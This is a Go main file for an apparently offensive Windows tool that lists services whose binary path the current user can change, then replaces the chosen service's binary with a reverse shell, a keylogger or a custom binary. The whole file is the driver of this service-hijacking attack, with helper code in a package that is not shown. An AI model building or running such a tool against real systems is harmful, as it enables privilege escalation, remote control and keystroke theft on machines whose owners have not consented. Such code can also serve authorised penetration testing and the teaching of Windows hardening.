package main

import (
	"fmt"

	"os"

	"github.com/Luke5080/win-binary-hijacking/internal/enumwin"
	"github.com/fatih/color"
)

func main() {
	homeDir, _ := os.UserHomeDir()

	text, err := os.ReadFile(homeDir + `\win-binary-hijacking\internal\banner\banner.txt`)

	if err != nil {
		color.Red("Could not read banner: ", err)
	}

	color.Red(string(text))

	color.Red("Author: Luke Marshall\n\n")

	// Slice holding of type *enum.WeakServ to display
	// choice of services that are exploitable to the user.
	var userOptions []*enumwin.WeakServ

	var userChoice int

	var binaryChoice int

	binaryOptions := [3]string{"Reverse Shell", "Key logger", "Custom binary"}

	chanBack := enumwin.EnumServ()

	// Itterate through values in returned channel
	// and append them to the userOptions slice
	for val := range chanBack {
		userOptions = append(userOptions, val)
	}

	if len(userOptions) > 0 {
		color.Red("\n\nCan Modify the following services:\n")

		// Display each entry in the userOptions slice
		// as well as their index to provide menu of
		// options for the user
		for index, val := range userOptions {
			color.Red("%d: %s", index+1, val.Name)
		}

		color.Red("\n\nChoose a service to modify:\n")

		r, err := fmt.Scanln(&userChoice)

		// Error handling for user choice input
		// Personal Notes: Scanln returns number of
		// succesfully read arguments and err
		// If arguments read = 0 or err != nil
		// Ask for input again. Similarily, if
		// user choice is not an index of the
		// the the userOptions slice, ask again
		for r != 1 || err != nil || userChoice > len(userOptions) || userChoice <= 0 {
			r, err = fmt.Scanln(&userChoice)
		}

		color.Red("\nWhat binary would you like to replace the service binary with?\n")

		for index, val := range binaryOptions {
			color.Red("%d: %s\n", index+1, val)
		}

		fmt.Scanln(&binaryChoice)

		for r != 1 || err != nil || binaryChoice > len(binaryOptions) || binaryChoice <= 0 {
			r, err = fmt.Scanln(&binaryChoice)
		}

		enumwin.ChangeBinPath(userOptions[userChoice-1], binaryChoice)

	} else {
		color.Red("No services found which you can modify")
	}

}
